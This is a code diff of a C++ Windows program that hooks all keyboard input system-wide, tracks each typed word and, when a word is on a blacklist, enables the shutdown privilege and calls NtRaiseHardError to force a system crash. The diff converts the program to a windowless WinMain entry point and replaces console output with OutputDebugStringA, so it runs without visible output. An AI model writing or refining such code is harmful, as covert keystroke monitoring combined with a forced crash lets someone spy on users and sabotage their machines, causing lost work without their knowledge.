@@ -29,7 +29,6 @@ static std::string get_last_error_string() {
         (LPSTR)&msg_buffer, 0, nullptr);
 
     std::string message(msg_buffer, size);
-
     LocalFree(msg_buffer);
 
     return message;
@@ -38,46 +37,51 @@ static std::string get_last_error_string() {
 static void raise_hard_error() {
     HMODULE ntdll = LoadLibraryA("ntdll.dll");
     if (!ntdll) {
-        std::cerr << "LoadLibraryA failed. Could not load ntdll.dll: "
-                  << get_last_error_string() << std::endl;
+        OutputDebugStringA(("LoadLibraryA failed. Could not load ntdll.dll: " +
+                            get_last_error_string())
+                               .c_str());
         exit(EXIT_FAILURE);
     }
 
     LPVOID adjust_privilege_addr = GetProcAddress(ntdll, "RtlAdjustPrivilege");
     if (!adjust_privilege_addr) {
-        std::cerr << "GetProcAddress failed. Could not find address of "
-                     "RtlAdjustPrivilege: "
-                  << get_last_error_string() << std::endl;
+        OutputDebugStringA(("GetProcAddress failed. Could not find address of "
+                            "RtlAdjustPrivilege: " +
+                            get_last_error_string())
+                               .c_str());
         exit(EXIT_FAILURE);
     }
 
     HMODULE ntdll_handle = GetModuleHandle("ntdll.dll");
     if (!ntdll_handle) {
-        std::cerr << "GetModuleHandle failed. Could not load ntdll.dll: "
-                  << get_last_error_string() << std::endl;
+        OutputDebugStringA(
+            ("GetModuleHandle failed. Could not load ntdll.dll: " +
+             get_last_error_string())
+                .c_str());
         exit(EXIT_FAILURE);
     }
 
     LPVOID raise_hard_error_addr =
         GetProcAddress(ntdll_handle, "NtRaiseHardError");
     if (!raise_hard_error_addr) {
-        std::cerr << "GetProcAddress failed. Could not find address of "
-                     "NtRaiseHardError: "
-                  << get_last_error_string() << std::endl;
+        OutputDebugStringA(("GetProcAddress failed. Could not find address of "
+                            "NtRaiseHardError: " +
+                            get_last_error_string())
+                               .c_str());
         exit(EXIT_FAILURE);
     }
 
     pdef_RtlAdjustPrivilege rtl_adjust_privilege =
         (pdef_RtlAdjustPrivilege)adjust_privilege_addr;
-
     pdef_NtRaiseHardError nt_raise_hard_error =
         (pdef_NtRaiseHardError)raise_hard_error_addr;
 
     BOOLEAN enabled;
     NTSTATUS adjust_status = rtl_adjust_privilege(19, TRUE, FALSE, &enabled);
     if (adjust_status != 0) {
-        std::cout << "Failed to adjust privilege: NTSTATUS: 0x" << std::hex
-                  << adjust_status << std::endl;
+        OutputDebugStringA(("Failed to adjust privilege: NTSTATUS: 0x" +
+                            std::to_string(adjust_status))
+                               .c_str());
         exit(EXIT_FAILURE);
     }
 
@@ -85,8 +89,9 @@ static void raise_hard_error() {
     NTSTATUS hard_err_status =
         nt_raise_hard_error(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &resp);
     if (hard_err_status != 0) {
-        std::cout << "Failed to raise hard error: NTSTATUS: 0x" << std::hex
-                  << adjust_status << std::endl;
+        OutputDebugStringA(("Failed to raise hard error: NTSTATUS: 0x" +
+                            std::to_string(hard_err_status))
+                               .c_str());
         exit(EXIT_FAILURE);
     }
 }
@@ -98,7 +103,8 @@ static std::unordered_set<std::string> blacklist;
 static void load_blacklist(const std::string& filename) {
     std::ifstream file(filename);
     if (!file.is_open()) {
-        std::cerr << "Failed to load blacklist from " << filename << std::endl;
+        OutputDebugStringA(
+            ("Failed to load blacklist from " + filename).c_str());
         exit(EXIT_FAILURE);
     }
 
@@ -107,7 +113,6 @@ static void load_blacklist(const std::string& filename) {
         if (line.starts_with("#")) {
             continue;
         }
-
         blacklist.insert(line);
     }
 }
@@ -122,14 +127,15 @@ static LRESULT CALLBACK keyboard_proc(int n_code, WPARAM w_param,
     if (w_param == WM_KEYDOWN || w_param == WM_SYSKEYDOWN) {
         BYTE keyboard_state[256];
         if (!GetKeyboardState(keyboard_state)) {
-            std::cerr << "GetKeyboardState failed: " << get_last_error_string()
-                      << std::endl;
+            OutputDebugStringA(
+                ("GetKeyboardState failed: " + get_last_error_string())
+                    .c_str());
             exit(EXIT_FAILURE);
             return CallNextHookEx(keyboard_hook, n_code, w_param, l_param);
         }
 
         if (keyboard->vkCode == VK_BACK) {
-            if (last_word.size() > 0) {
+            if (!last_word.empty()) {
                 last_word.pop_back();
             }
         }
@@ -143,7 +149,8 @@ static LRESULT CALLBACK keyboard_proc(int n_code, WPARAM w_param,
 
             if (std::isspace(c)) {
                 if (blacklist.contains(last_word)) {
-                    std::cout << "Found blacklisted word: " << last_word;
+                    OutputDebugStringA(
+                        ("Found blacklisted word: " + last_word).c_str());
                     raise_hard_error();
                 }
                 last_word.clear();
@@ -156,19 +163,18 @@ static LRESULT CALLBACK keyboard_proc(int n_code, WPARAM w_param,
     return CallNextHookEx(keyboard_hook, n_code, w_param, l_param);
 }
 
-int main(int argc, char* argv[]) {
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
+                   LPSTR lpCmdLine, int nShowCmd) {
     keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_proc, NULL, 0);
     if (!keyboard_hook) {
-        std::cerr << "Failed to install hook: " << get_last_error_string()
-                  << std::endl;
+        OutputDebugStringA(
+            ("Failed to install hook: " + get_last_error_string()).c_str());
         return EXIT_FAILURE;
     }
 
-    std::string filename;
-    if (argc > 1) {
-        filename = argv[1];
-    } else {
-        filename = "blacklist.txt";
+    std::string filename = "blacklist.txt";
+    if (lpCmdLine && strlen(lpCmdLine) > 0) {
+        filename = lpCmdLine;
     }
 
     load_blacklist(filename);
